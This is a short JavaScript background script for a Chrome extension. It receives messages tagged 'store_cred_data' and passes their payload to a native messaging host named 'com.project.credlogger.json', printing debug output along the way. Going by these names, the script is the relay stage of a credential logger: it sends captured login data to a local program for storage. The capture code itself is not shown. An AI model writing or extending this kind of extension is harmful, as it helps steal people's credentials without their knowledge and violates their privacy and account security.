chrome.runtime.onMessage.addListener((request, sender) => {
  if (request.action === 'store_cred_data') {
    console.log("[DEBUG][Background] Forwarding to native:", request.payload); // 🔍 DevTools > Service Worker console
    chrome.runtime.sendNativeMessage("com.project.credlogger.json", request.payload, (response) => {
      if (chrome.runtime.lastError) {
        console.error("[ERROR] Native Messaging Failed:", chrome.runtime.lastError.message);
      } else {
        console.log("[DEBUG] Native response:", response);
      }
    });
  }
});
